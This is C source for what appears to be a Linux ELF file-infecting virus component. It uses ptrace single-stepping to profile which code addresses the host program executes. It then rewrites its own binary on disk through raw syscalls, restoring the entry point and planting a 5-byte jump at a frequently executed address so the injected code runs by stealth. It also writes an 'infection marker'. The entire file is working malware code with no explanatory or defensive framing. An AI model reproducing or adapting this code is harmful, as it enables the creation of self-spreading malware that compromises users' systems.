#include <linux/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/reg.h>
#include <linux/user.h>
#include <stdlib.h>
#undef PAGE_SIZE

#ifdef	DEBUG
#define	Dprintf(...)	printf(__VA_ARGS__)
#else
#define	Dprintf(...)
#endif

#define	MAX_PASSES	3

int ptrace(int, int, void*, void*);
char *selfexe = NULL;
uint8_t old_bytes[5] = {0,0,0,0,0};

typedef struct _addr_t addr_t;
struct _addr_t {
	addr_t *chain;
	uint32_t addr, max, count;
	int min;
};

#define	HASH_SIZE	1021

/* Thomas Wang's function */
uint32_t inthash(uint32_t a)
{
	a += ~(a<<15);
	a ^= (a>>10);
	a += (a<<3);
	a ^= (a>>6);
	a += ~(a<<11);
	a ^= (a>>16);
	return a;
}

addr_t *lookup(addr_t **Ah, uint32_t addr)
{
	addr_t *entry = Ah[inthash(addr) % HASH_SIZE];
	while (entry)
		if (entry->addr == addr)
			return entry;
		else
			entry = entry->chain;
	return NULL;
}

void dump_table(Elf32_Ehdr *ehdr, Elf32_Phdr *phdr, uint32_t magic, addr_t *At, int N, int phdr_index)
{
	/* low-level patch routine executed from random place in memory,
	no external calls or globals allowed, data is a serialized table
	of patches:
	List of segments to munmap:
	[ address	]	DWORD
	[ size		]	DWORD
	next segment...
	[ 0		]
	List of patches in the file:
	[ offset	]	DWORD
	[ size		]	DWORD
	[ buffer 	]	size x bytes
	next record ...
	[ 0		]	DWORD
	Finally this routine doing ftruncate() @ current position & exit(0),
	there is nothing left to do */
	void ll_dump_table(char *s, uint8_t *data) {
		uint32_t x, y, foo;
		uint32_t *p = (uint32_t*)data;
#define	PICK	*p++
		/* munmap all segments */
		while ((x = PICK) != 0) {
			y = PICK;
			/* munmap(x, y) */
			asm volatile ("int $0x80":"=a"(foo):"a"(91),"b"(x),"c"(y));
		}
		int h;
		/* open(selfexe, O_RDWR) */		
		asm volatile ("int $0x80": "=a"(h): "a"(5), "b"(s), "c"(2));
		/* pick the offset */
		while ((x = PICK) != 0) {
			y = PICK;
			/* lseek(h, x, SEEK_SET) */
			asm volatile ("int $0x80":"=a"(foo): "a"(19), "b"(h), "c"(x), "d"(0));
			/* write(h, p, y) */
			asm volatile ("int $0x80":"=a"(foo): "a"(4), "b"(h), "c"(p), "d"(y));
			p = (uint32_t*)((char*)p + y);
		}
		/* x = lseek(h, 0, SEEK_CUR) */
		asm volatile ("int $0x80":"=a"(x): "a"(19), "b"(h), "c"(0), "d"(1));
		/* ftruncate(h, x) */
		asm volatile ("int $0x80":"=a"(foo): "a"(93), "b"(h), "c"(x));
#undef	PICK
		/* exit(0) */
		asm volatile ("int $0x80":: "a"(1), "b"(0));
	}

	/* copy path to self into stack */
	char self[strlen(selfexe)+1];
	strcpy(self, selfexe);
	/* allocate memory for the dumper */
	uint8_t *d = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
	if (d == MAP_FAILED)
		goto _error;
	/* should be enough, right? */
	memcpy(d, ll_dump_table, 1024);
	/* make it R/X */
	mprotect(d, 4096, PROT_READ | PROT_EXEC);
	/* prepare the args and table */
	/* allocate the memory (MAGIC&COUNTER, 2-DWORDs-per-table entry or patch table, phdrs and misc stuff) */
	uint32_t *p;
	uint8_t *data = malloc(8 + (magic == 0xdeadbeef ? N * 8 : N) + 64*32);
	int i;
	p = (uint32_t*)data;
#define	EMIT(x) *p++ = x;
	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_LOAD) {
			/* ELF_PAGESTART */
			uint32_t x = phdr[i].p_vaddr & 0xfffff000;
			EMIT(x);
			/* filesz + page offset */
			EMIT(phdr[i].p_filesz + (phdr[i].p_vaddr - x));
		}
	/* terminate segments list */
	EMIT(0);
	/* write block 0 (update Program Header Table) */
	uint32_t seg_size;
	if (magic == 0xdeadbeef)
		seg_size = 8;
	else
		seg_size = 8 + N * 8;
	uint32_t o = ehdr->e_phoff + sizeof(Elf32_Phdr) * phdr_index + 16;
	EMIT(o);
	EMIT(8);
	EMIT(seg_size); /* p_filesz */
	EMIT(seg_size); /* p_memsz */
	/* write block 1 (Table) */
	if (magic == 0xdeadbeef) {
		/* merge N-bytes patch table from caller */
		memcpy(p, (char*)At, N);
		p = (uint32_t*)((char*)p + N);
		/* no more tables, marker only */
		EMIT(phdr[phdr_index].p_offset);
		EMIT(8);
		EMIT(magic);		
		EMIT(0);		
	} else {
		EMIT(phdr[phdr_index].p_offset);
		EMIT(N * 8 + 8);
		EMIT(magic);
		EMIT(N);
		for (i = 0; i < N; i++) {
			EMIT(At[i].addr);
			EMIT((At[i].min << 16) | At[i].count);
		}
	}
	/* terminate patch list */
	EMIT(0);
	((void(*)())d)(self, data);
_error:	exit(0);
}

extern void _jmpentry(void);

void setup_tracer(void)
{
	addr_t *At = NULL;	/* address table */
	addr_t *Ah[HASH_SIZE];	/* address hash */
	int N = 0;
	uint32_t old_entry = (uint32_t)&__entry;

	Dprintf("[ Entering tracer\n");
	/* get our temporaries */
	int i, tmpidx = -1;
	uint8_t *m = get_base((uint32_t)&__text_start);
	Elf32_Ehdr *ehdr = (Elf32_Ehdr*)m;
	Elf32_Phdr *phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	Elf32_Dyn *d, *_DYNAMIC = NULL;
	/* assignment to supress the warning */
	uint32_t ts = 0, te = 0, ba = 0;
	/* 	ts - supposed .text start (tracer will check [ts ... te] range only
		te - supposed .text end
		ba - base address
	*/
	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD) {
			if (phdr[i].p_offset == 0) {
				ts = phdr[i].p_vaddr;
				ba = ts;
				te = ts + phdr[i].p_filesz;
			}
			uint32_t magic = *(uint32_t*)phdr[i].p_vaddr;
			if (magic == 0x1BADF00D) {
				Dprintf("I am a bad food :-(\n");
				goto _error;
			}
			if (magic == 0xDEADBEEF) {
				Dprintf("Work's done.\n");
				goto _error;
			}
			if (magic == 0xFEEDF00D) {
				tmpidx = i;
			}		
		}
		if (phdr[i].p_type == PT_DYNAMIC) {
			_DYNAMIC = (Elf32_Dyn*)phdr[i].p_vaddr;
		}
	}
	if (tmpidx == -1) {
		Dprintf("No marker!\n");
		goto _error;
	}
	/* narrow the code boundaries */
	if (_DYNAMIC != NULL)
		for (d = _DYNAMIC; d->d_tag != DT_NULL; d++)
			if (d->d_tag == DT_INIT && d->d_un.d_val > ts)
				ts = d->d_un.d_val;
			else
			if (d->d_tag == DT_FINI && d->d_un.d_val < te)
				te = d->d_un.d_val;
	/* for all executables in CentOS 5 that I've checked, there was
	not a single binary whose EP != (.text).sh_addr */
	if (old_entry > ts)
		ts = old_entry;
	
	/* setup single step debugger */
        int status;
        int pid;
        struct user_regs_struct regs;
        uint32_t old_eip = 0, counter = 0;
        if ((pid = fork()) == -1)
        	return;
        if (pid == 0) {
        	/* child process */
        	ptrace(PTRACE_TRACEME, 0, 0, 0);
       		kill(getpid(), SIGINT);
        	Dprintf("Entering child\n");
        } else {
        	bzero(Ah, sizeof(void*)*HASH_SIZE);
		for (;;) {
			wait(&status);
			/* we've lost our child */
			if (WIFEXITED(status))
				break;
			ptrace(PTRACE_GETREGS, pid, 0, &regs);
			/* Skip REP... and similar */			
			if (old_eip != regs.eip) {
				/* ok, here is our job */
				if (regs.eip >= ts && regs.eip < te) {
					counter++;
					/* too much instructions, leave it alone */
					if (counter == 0)
						goto _fatal;
					addr_t *a = lookup(Ah, regs.eip);
					if (a == NULL) {
						/* insert into table */				
						At = (addr_t*)realloc(At, (N + 1) * sizeof(addr_t));
						a = &At[N];
						N++;
						/* fill the values */
						a->addr = regs.eip;
						a->min = a->max = counter;
						a->count = 1;
						/* insert into hash */
						uint32_t h = inthash(regs.eip) % HASH_SIZE;
						a->chain = Ah[h];
						Ah[h] = a;
					} else {
						if (counter > a->max)
							a->max = counter;
					}
				}
				old_eip = regs.eip;	
			}
			ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
		}
		/* counter now holds value for the exit node */
		/* find a minimial distance for each node and normalize it to two-bytes range */
		Dprintf("Tracer stoppped\n");
		for (i = 0; i < N; i++) {
			uint32_t x;
			x = counter - At[i].min;
			if (x < At[i].min)
				At[i].min = x;
			x = counter - At[i].max;
			if (x < At[i].min)
				At[i].min = x;
			At[i].min = (unsigned short)(((float)At[i].min / counter) * 65535.0);
		}
		/* merge two tables */
		uint32_t max_count = 0;
		if (tmpidx != -1) {
			/* skip magic */
			uint32_t *rt = (uint32_t*)(phdr[tmpidx].p_vaddr + 4);
			/* read the tables */
			uint32_t count = *rt++; 
			for (i = 0; i < count; i++) {
				uint32_t addr, count;
				int min;
				addr = *rt++;
				count = *rt++;
				min = count >> 16;
				count &= 0xffff;
				addr_t *a = lookup(Ah, addr);
				if (a == NULL) {
					/* this time we didn't go through this, just copy */
					At = realloc(At, (N + 1) * sizeof(addr_t));
					a = &At[N];
					N++;
					a->addr = addr;
					a->count = count;
					a->min = min;
					uint32_t h = inthash(addr) % HASH_SIZE;
					a->chain = Ah[h];
					Ah[h] = a;
				} else {
					/* incremental average of two values */
					/* A_{n+1} = A_n + \frac{v_{n+1}-A_n}{n+1} */
					a->count = count + 1;
					a->min = min + (a->min - min) / (int)a->count;
					if (a->count > max_count)
						max_count = a->count;
				}
			}
			/* we should check the final result only if there was something to merge */
			/* otherwise we have only count-1 values from the current pass */
			if (max_count > MAX_PASSES) {
				/* pick the candidate */
				int sort_count_min(addr_t *a, addr_t *b) {
					int x = (int)b->count - (int)a->count;
					if (x == 0) {
						x = (int)b->min - (int)a->min;
					}
					return x;
				}
				/* hash table after qsort() is no longer valid */
				qsort(At, N, sizeof(addr_t), (int(*)(const void*,const void*))sort_count_min);
				/* pick our candidate */
				uint32_t patch_addr = At[0].addr;
				uint32_t patch_offset = At[0].addr - ba;

				/* Ok, we have candidate */
				uint8_t *patch_table = malloc(128);
				uint32_t *p = (uint32_t*)patch_table;
				if (patch_table == NULL)
					goto _error;
				/* prepare the patch table for ll_dump_table */
				/* a) restore old entry point */
				EMIT( (char*)&ehdr->e_entry - (char*)ehdr);
				EMIT(4);
				EMIT(old_entry)
				/* b) save 5 bytes from found location into old_bytes */
				EMIT((uint32_t)old_bytes - ba);
				EMIT(5);
				memcpy((char*)p, (char*)patch_addr, 5);
				p = (uint32_t*)((char*)p + 5);
				/* c) write 5 bytes of our jump to found location */
				uint8_t nb[5];
				nb[0] = 0xe9;
				/* FIXME: what the fuck? */
				uint32_t x = (uint32_t)&__text_start;
				x -= (patch_addr + 5);
				*(uint32_t*)(nb + 1) = x;
				EMIT(patch_offset);
				EMIT(5);
				memcpy((char*)p, nb, 5);
				p = (uint32_t*)((char*)p + 5);
				Dprintf("Patch offset: %08x, address: %08x\n", patch_offset, patch_addr);
				/* d) update our return-to-host jump */
				EMIT((uint32_t)_jmpentry + 1 - ba);
				EMIT(4);
				EMIT(patch_addr - (uint32_t)_jmpentry - 5);
				/* remove tracer's table, write infection marker, update executable */
				dump_table(ehdr, phdr, 0xDEADBEEF, (addr_t*)patch_table, (char*)p - (char*)patch_table, tmpidx);
			}
		}
		/* hash table after qsort() is no longer valid */
		int sort_addr(addr_t *a, addr_t *b) {
			return (int)b->addr - (int)a->addr;
		}
		qsort(At, N, sizeof(addr_t), (int(*)(const void*,const void*))sort_addr);
		/* dump data, no return f-n */
		dump_table(ehdr, phdr, 0xFEEDF00D, At, N, tmpidx);
	}
_error:
	return;
_fatal:
	dump_table(ehdr, phdr, 0x1BADF00D, NULL, 0, -1);
}
#undef	EMIT
